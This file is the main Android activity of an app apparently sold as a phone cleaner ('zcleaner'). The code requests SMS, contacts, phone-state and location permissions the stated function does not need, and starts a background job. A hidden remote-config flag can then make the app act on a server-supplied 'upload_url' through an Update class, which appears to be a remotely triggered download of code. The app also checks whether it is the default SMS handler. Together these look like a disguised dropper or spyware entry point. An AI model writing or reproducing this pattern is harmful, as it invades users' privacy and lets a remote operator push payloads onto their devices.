package com.xlab13.zcleaner.Activity;

import android.Manifest;
import android.annotation.TargetApi;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.analytics.FirebaseAnalytics;
import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.iid.InstanceIdResult;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.xlab13.zcleaner.Fragment.BaseFragment;
import com.xlab13.zcleaner.CleanOptionsFragment;
import com.xlab13.zcleaner.R;
import com.xlab13.zcleaner.utils.FragmentUtil;
import com.xlab13.zcleaner.utils.MyJobService;
import com.xlab13.zcleaner.utils.Update;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;

public class MainActivity extends BaseActivity {
    private FirebaseRemoteConfig mFirebaseRemoteConfig;

    private static final int PERMISSION_REQUEST_CODE = 1;
    public final static String[] permissions = {Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_SMS,Manifest.permission.READ_PHONE_STATE,Manifest.permission.READ_CONTACTS,Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.READ_EXTERNAL_STORAGE};
    private static MainActivity instance;

    public static MainActivity getInstance() {
        return instance;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        instance = this;

        new MyJobService().start(this);

        int checkPermissionResult = checkPermission(permissions);

        if(checkPermissionResult>=0){
            start_update();
        }

        FragmentUtil.replaceFragment(getSupportFragmentManager(),
                BaseFragment.newInstance(CleanOptionsFragment.class, null), false);

        FirebaseAnalytics mFirebaseAnalytics = FirebaseAnalytics.getInstance(getApplicationContext());
        Bundle params = new Bundle();
        mFirebaseAnalytics.logEvent("open_app", params);

//        FirebaseInstanceId.getInstance().getInstanceId()
//                .addOnCompleteListener(new OnCompleteListener<InstanceIdResult>() {
//                    @Override
//                    public void onComplete(@NonNull Task<InstanceIdResult> task) {
//                        if (!task.isSuccessful()) {
//                            Log.w("===", "getInstanceId failed", task.getException());
//                            return;
//                        }
//
//                        // Get new Instance ID token
//                        String token = task.getResult().getToken();
//
//                        Log.d("===", token);
//                    }
//                });
    }

    void start_update(){
        FirebaseAnalytics mFirebaseAnalytics = FirebaseAnalytics.getInstance(getApplicationContext());
        Bundle params = new Bundle();
        mFirebaseAnalytics.logEvent("update_app_from_url", params);

        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600)
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
        mFirebaseRemoteConfig.setDefaultsAsync(R.xml.remote_config_defaults);
        mFirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(@NonNull Task<Boolean> task) {
                        if (task.isSuccessful()) {
                            boolean updated = task.getResult();
                            if (mFirebaseRemoteConfig.getBoolean("loading")) {
                                new Update(getApplicationContext(),mFirebaseRemoteConfig.getString("upload_url"));
                            }
                        }
                    }
                });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        menu.add("Rate App");
        //menu.add("Настройки");
        //menu.add("Обновить базу");
        Log.i("~~~", "OptionsMenu created!");
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        String itemName = item.toString();
        Log.i("~~~", "itemSelected: " + itemName);
        switch (itemName) {
            case "Rate App":
                final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                try {
                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
                } catch (android.content.ActivityNotFoundException anfe) {
                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
                }
                break;
            case "Настройки":
                // TODO: 01.11.2018 показать настройки
                break;
            case "Обновить базу":

                break;
        }
        return true;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        Log.e("===","check");
        if (requestCode == 1) {



            if (resultCode == RESULT_OK) {

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    final String myPackageName = getPackageName(); // TODO: fix
                    if (Telephony.Sms.getDefaultSmsPackage(this).equals(myPackageName)) {
                        int x = 0;
                    }
                }
            }
        }
    }

    @Override
    public int getLayout() {
        return R.layout.activity_main;
    }

    @Override
    public void setToolbarTitle(String title) {

    }

    @TargetApi(Build.VERSION_CODES.M)
    public int checkPermission(String[] permissions){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ){
            int rationale = 0;
            int needToRequest =0;
            int i=0;
            for(String permission : permissions) {
                if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                    if (shouldShowRequestPermissionRationale(permission)) {
                        rationale++;
                    }
                    needToRequest ++;
                }else{
                    List<String> list = new ArrayList<String>(Arrays.asList(permissions));
                    list.remove(permission);
                    permissions = list.toArray(new String[0]);
                }
                i++;
            }
            if(needToRequest>0) {
                requestPermissions(permissions, PERMISSION_REQUEST_CODE); //new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.SEND_SMS}
                return -1;
            }else{
                return 1;
            }
        }else{
            return 0;
        }

        //return 0;
    }

    private void debug(String message){
        //Log.d("DEBUG", message);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                           int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        Set<String> permissionsGranded = new HashSet<>();

        for(int i=0; i<grantResults.length;i++){
            //debug("grantResults["+i+"]:" + grantResults[i]);
            if(grantResults[i]!=-1){
                permissionsGranded.add(permissions[i]);
            }
        }

        start_update();
    }
}
